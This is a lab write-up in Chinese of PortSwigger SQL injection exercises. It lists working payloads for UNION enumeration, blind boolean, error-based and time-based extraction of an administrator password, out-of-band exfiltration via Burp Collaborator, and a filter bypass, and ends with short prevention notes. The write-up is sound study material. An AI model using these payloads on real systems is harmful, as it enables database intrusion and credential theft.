---
title: "PortSwigger SQLi writeup"
published: 2025-01-31T00:00:00.000Z
description: ""
tags: []
category: "general"
draft: false
---
## **SQL injection attack, querying the database type and version on MySQL and Microsoft**



1. 開始會需要用到 Burp Suite Repeater 來幫忙轉成 URL Encoding 了（而且也比較方便看 response）
2. 注意註記符號 “—” 有時候要改成 “#” 才能過
3. 曾經試過的幾個payload
    1. Gifts'+UNION+SELECT+@@version,+NULL#
    2. Gifts'%2bUNION%2bSELECT%2b%40%40version%2c%2bNULL%23 (上一個的URL型態)
    3. Gifts' UNION SELECT @@version, 'abc' #
    4. Gifts'%20UNION%20SELECT%20%40%40version%2c%20'abc'%20%23（上一個的URL型態，命中！）

![image](https://hackmd.io/_uploads/SJjoZ4IOyg.png)


結論：”+”不能亂加，然後要試試看 URL型態，而且註記符號要多試試看 ”#”


<!--more-->


## **SQL injection attack, listing the database contents on non-Oracle databases**

> 整體流程：先看information_schema_tables有哪些table，再往下繼續進攻

Payloads
```
%27+UNION+SELECT+table_name,+NULL+from+information_schema.tables--
```
要記得有兩個回傳值！

發現有一個叫做 users_abcdef，繼續探索！
```
%27+UNION+SELECT+column_name,null+from+information_schema.columns+where+table_name=%27users_jvzepp%27--
```
(發現這一題用"+"連接比較能夠執行，然後要注意是用information_schema_columns！)

![image](https://hackmd.io/_uploads/rk3H1uUdJe.png)

往下一層走！
```
%27+UNION+SELECT+username_jxzshr,+password_sdwxli+from+users_oogkho--
```
![image](https://hackmd.io/_uploads/r1oWNYLOJx.png)

結束收工！

p.s 問題點
其實我還是不知道該如何呼叫出這樣的表格
可能會再研究一陣子ww
![image](https://hackmd.io/_uploads/BkJw4K8OJe.png)




## **Blind SQL injection with conditional responses**

```
TrackingId=<那時候的cookie>' AND '1'='1
```
測起來發現welcome back可以作為 Blind SQLi 判斷依據

接著改Tracking ID

`' and (select 'a' from users where username = 'administrator' and length(password)><暴力破解的地方>)='a`

發現這時候welcome back消失(從length觀察最明顯！)
所以密碼是 20 位！
![image](https://hackmd.io/_uploads/HJKLPqUdkx.png)


接下來會用到一個叫做 SUBSTRING() 的函式！
複習一下：`SUBSTRING(字串, 起始位置, 長度)`
```
SUBSTRING('abcd', 2, 1)  -- 取得 'b'
SUBSTRING('abcd', 3, 2)  -- 取得 'cd'
```

接著因為要一個一個測試太麻煩了，再交給intruder做一次！
然後因為我想要同時從第1-20位一個一個檢測a-z,0-9
有兩個位置，所以使用cluster bomb!

`Cookie: TrackingId=1Be9Mx18D4iTRv39' and (select SUBSTRING(password,<位置1>,1) from users where username = 'administrator')='<位置2>;`

最後結果！（可以搭配 View Filter 還有 Payload 1 降冪來協助方便分析）
![image](https://hackmd.io/_uploads/BkAv7sUu1x.png)
組合起來就是 administrator 的密碼了！





## **Blind SQL injection with conditional errors**
> 因為不是要用and了，是另外一個獨立的語句
> 所以在oracle裡面要用 || 連接語法！

順便稍微複習一下 SQL 的 case 用法！
```
SELECT CASE
         WHEN condition1 THEN result1
         WHEN condition2 THEN result2
         ELSE result_default
       END
```
舉例：
```
SELECT name,
       CASE
         WHEN salary < 3000 THEN 'Low'
         WHEN salary BETWEEN 3000 AND 5000 THEN 'Medium'
         ELSE 'High'
       END AS salary_category
FROM employees;
```

![image](https://hackmd.io/_uploads/H1IfNat_Jx.png)

![image](https://hackmd.io/_uploads/rkve4pY_yg.png)

![image](https://hackmd.io/_uploads/HklDJraYO1l.png)

![image](https://hackmd.io/_uploads/ryiqVpKdkl.png)



## **<font color="#b543ff">Visible error-based SQL injection</font>**
> 這一個 Lab 是要去故意製造
> 會顯示線索的錯誤資訊！

<font color="#ff8a38"></font>

`TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`
要特別注意，因為這一個網站會去限制 TrackingID 的長度，所以一定要把原本的 ID 全部刪掉，直接用 ' 替代，才有足夠的空間留給我們的 payload !

Q: 那為什麼不直接用前一題的 ||(select...... 就好？
A: 雖然可以成功把 payload 送進去，可是系統判讀成功後是會直接顯示商品畫面，而不會有任何密碼顯示，所以才要故意用 1=cast() 去製造錯誤訊息！


![image](https://hackmd.io/_uploads/HJGKsaKO1g.png)

![image](https://hackmd.io/_uploads/ryS3j6Ku1l.png)




## **Blind SQL injection with time delays and information retrieval**
> 跟前面一樣的套路
> 只是記得 resource pool 並行要改一次一個才能看出時間的差距！


![image](https://hackmd.io/_uploads/H1NuJecuyg.png)

![image](https://hackmd.io/_uploads/H18v1xcd1x.png)

![image](https://hackmd.io/_uploads/Byi8Wx5_1l.png)

![image](https://hackmd.io/_uploads/SJFzbg5_1l.png)


## **Blind SQL injection with out-of-band interaction**

> 這題是要透過 DNS Lookup 來完成
> 題目裡有提示說可以翻一下 BurpSuite 他們家的cheat sheet
![image](https://hackmd.io/_uploads/Sk-SvW5_kx.png)
先用Oracle試試看
記得要把 BURP-COLLABORATOR-SUBDOMAIN 改成去到burpsuite的collaborator 裡面 payload copy 的連結！
![image](https://hackmd.io/_uploads/BkjzwWcuJg.png)
看到這個畫面就代表做對了！


## **Blind SQL injection with out-of-band data exfiltration**
上一題的伏筆就在這一題出現了！
我們一樣可以用官方給的 cheat sheet 下手，只是上一題沒討論到query部分這時候就可以上場了！

![image](https://hackmd.io/_uploads/Sk-SvW5_kx.png)

![image](https://hackmd.io/_uploads/S1e42Z5_kx.png)

直接在 query 部分打上我們在前幾個 lab 裡面請求密碼的方法
然後可以順便注意，我們後面緊接著的就是 collaborator payload
所以，
![image](https://hackmd.io/_uploads/BJGm3-qOyg.png)
得到的結果看 payload 之前的前半段就是我們 query 得到的密碼！


## **SQL injection with filter bypass via XML encoding**
> 這一題開始會需要用到 extensions!
> 會用到的叫做hackvertor，可以在 Extensions->BApp Store 裡面直接下載來用

題目有直接說弱點在 check stock 的 post 上（去點一下 check stock 按鈕就會抓到！）

這個 lab 最主要的特點是 Select 這個字眼會被擋掉（會顯示Attack detected擋住），所以才要用 hackvertor 來加密繞過驗證！
然後注意一件事：
如果回傳兩行會一律跳出 0 unit，其實就是代表 error 了
所以要用單行回傳方式（複習一下：用 | |'<連接的符號>'| |）
![image](https://hackmd.io/_uploads/Bkq5kGquye.png)
繞過後就可以順利得到密碼！


## **所以怎麼預防？**
1. 參數化（可是只能用在部分query中，像是table, column, ORDER BY就不適用）
2. 白名單（補救方法）
3. 特製判斷輸入邏輯